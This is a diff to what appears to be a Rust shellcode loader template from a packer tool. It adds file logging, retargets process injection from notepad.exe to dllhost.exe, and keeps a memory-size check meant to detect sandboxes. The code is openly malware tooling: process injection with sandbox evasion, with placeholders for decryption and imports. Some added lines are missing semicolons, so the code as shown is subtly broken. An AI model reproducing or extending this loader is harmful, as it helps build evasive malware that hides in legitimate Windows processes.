@@ -21,9 +21,18 @@ use ntapi::ntapi_base::CLIENT_ID;
 use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;
 use winapi::shared::ntdef::NULL;
 
+use std::fs::OpenOptions;
+use std::io::Write;
+
 {{IMPORTS}}
 
 {{DECRYPTION_FUNCTION}}
+
+fn append_to_file(file_path: &str, data: &[u8]) -> std::io::Result<()> {
+    let mut file = OpenOptions::new().create(true).append(true).open(file_path)?;
+    file.write_all(data)?;
+    Ok(())
+}
 
 fn boxboxbox(tar: &str) -> Vec<usize> {
     // search for processes to inject into
@@ -83,14 +92,19 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
 
 fn main() {
     // inject in the following processes:
-    let tar: &str = "notepad.exe";
+    let tar: &str = "dllhost.exe";
+    let file_path = "packer-log.txt";
+
+    append_to_file(file_path, b"Injecting into dllhost.exe")
 
     let mut memory = 0;
     unsafe {
         let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
         println!("{:#?}", is_quicksand);
         if is_quicksand != 1 {
-            println!("Hello.")
+            append_to_file(file_path, b"Quicksand!")
+        } else {
+            append_to_file(file_path, b"Not in quicksand")
         }
     }
 
@@ -101,6 +115,7 @@ fn main() {
     }
     let list: Vec<usize> = boxboxbox(tar);
     if list.len() == 0 {
+        append_to_file(file_path, b"Unable to find process dllhost.exe")
         println!("[-] Unable to find a process.")
     } else {
         for i in &list {
